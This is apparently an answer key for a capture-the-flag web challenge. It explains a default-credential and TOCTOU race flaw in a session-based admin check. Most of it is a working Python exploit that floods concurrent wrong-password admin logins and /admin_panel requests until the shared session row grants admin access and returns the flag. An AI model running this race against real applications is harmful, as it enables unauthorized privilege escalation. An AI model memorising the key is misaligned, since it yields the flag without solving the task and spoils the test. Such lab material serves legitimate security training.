# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Default creds + TOCTOU race in authorization. `/admin_panel`
validates the session twice; between the two reads, a concurrent
`POST /login` with `username=admin` (wrong password) writes `username=admin` into
the shared server-side session row, so the second read grants admin and returns
the flag. Default account: `test`/`test`.

1. **Log in as `test`/`test`** and reuse that cookie for the race.

2. **Warm the app**, then **flood it concurrently** with (a) `POST /login` as
   `admin` (any wrong password) and (b) `GET /admin_panel` with the test cookie,
   until `/admin_panel` returns the flag:

   ```python
   import requests, threading, re
   BASE = "http://<target>"
   s = requests.Session()
   s.post(f"{BASE}/login", data={"username":"test","password":"test"}, allow_redirects=False, timeout=15)
   cookies = s.cookies.get_dict()
   for _ in range(8):
       try: s.get(f"{BASE}/login", timeout=10)
       except requests.RequestException: pass
   found = threading.Event(); hold = {}
   la, pa = requests.Session(), requests.Session()
   def login_admin():
       while not found.is_set():
           try: la.post(f"{BASE}/login", data={"username":"admin","password":"x"}, cookies=cookies, timeout=10, allow_redirects=False)
           except requests.RequestException: pass
   def hit():
       while not found.is_set():
           try: r = pa.get(f"{BASE}/admin_panel", cookies=cookies, timeout=10)
           except requests.RequestException: continue
           m = re.search(r"FLAG\{[a-f0-9]+\}", r.text)
           if m: hold["f"] = m.group(0); found.set()
   ts = [threading.Thread(target=login_admin, daemon=True) for _ in range(15)] + \
        [threading.Thread(target=hit, daemon=True) for _ in range(15)]
   for t in ts: t.start()
   found.wait(timeout=90)
   print(hold.get("f"))
   ```

3. **Report the flag** (`FLAG{...}`) verbatim. It is a race — it may take several
   seconds; re-run if needed.
